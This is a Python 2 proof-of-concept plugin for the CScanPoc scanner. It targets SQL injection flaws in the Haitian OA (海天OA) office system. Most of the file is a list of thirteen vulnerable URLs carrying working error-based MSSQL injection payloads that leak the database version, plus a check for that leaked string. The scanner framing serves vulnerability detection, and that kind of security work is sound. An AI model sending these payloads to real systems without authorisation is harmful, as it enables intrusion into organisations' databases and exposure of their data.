# coding: utf-8

from CScanPoc.thirdparty import requests,hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()

class Vuln(ABVuln):
    vuln_id = 'HaitianOA_0012' # 平台漏洞编号，留空
    name = '海天OA系统存在SQL注入' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-02-12'  # 漏洞公布时间
    desc = '''
        海天OA系统存在多处GET型SQL注入漏洞：
        /ZhuanTi/OA_Loadlink.asp?OAID=1
        /ZhuanTi/OA_WordDocDisplay.asp?OAID=1
        /kaoQin/JiaoYanDis.asp?StartDate=1
        /Documents/OA_DocDisplay_NewWindow.asp?OAID=1
        /UserInfor/UserInfor.asp?UserName=sa
        /UserInfor/BuMenDetail.asp?OAID=1
        /message/mytreedata.asp?bumenid=1
        /message/BuMenDetail.asp?UserName=chen
        /mailClassInfor.asp?OAID=1
        /ZhuanTi/TongJi.asp?source=2&OAID=0
        /ZhuanTi/DocMain.asp?type=-1
        /Documents/OA_WordDocDisplay.asp?OAID=1
        /ZhuanTi/frmmain.asp?type=-1
    ''' # 漏洞描述
    ref = '' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=083161
    cnvd_id = '' # cnvd漏洞编号
    cve_id = '' #cve编号
    product = '海天OA'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'haitianoa_0007' # 平台 POC 编号，留空
    author = '国光'  # POC编写者
    create_date = '2018-05-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            #GET型
            urls  = [
                arg + '/ZhuanTi/OA_Loadlink.asp?OAID=1%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)',
                arg + '/ZhuanTi/OA_WordDocDisplay.asp?OAID=1%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)',
                arg + '/kaoQin/JiaoYanDis.asp?StartDate=1%27%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)--',
                arg + '/Documents/OA_DocDisplay_NewWindow.asp?OAID=1%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)',
                arg + '/UserInfor/UserInfor.asp?UserName=sa%27%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)--',
                arg + '/UserInfor/BuMenDetail.asp?OAID=1%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)',
                arg + '/message/mytreedata.asp?bumenid=1%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)--',
                arg + '/message/BuMenDetail.asp?UserName=chen%27%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)%20and%20%27abc%27=%27abc',
                arg + '/mailClassInfor.asp?OAID=1%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)',
                arg + '/ZhuanTi/TongJi.asp?source=2&OAID=0%27%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)--',
                arg + '/ZhuanTi/DocMain.asp?type=-1%27%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)--',
                arg + '/Documents/OA_WordDocDisplay.asp?OAID=1%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)',
                arg + '/ZhuanTi/frmmain.asp?type=-1%27%20and%201=convert(int,CHAR(87)%2BCHAR(116)%2BCHAR(70)%2BCHAR(97)%2BCHAR(66)%2BCHAR(99)%2B@@version)--',
            ]
            for url in urls:
                code, head, res, err, _ = hh.http(url)
                if (code == 200) and ('WtFaBcMicrosoft SQL Server' in res):
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()


if __name__ == '__main__':
    Poc().run()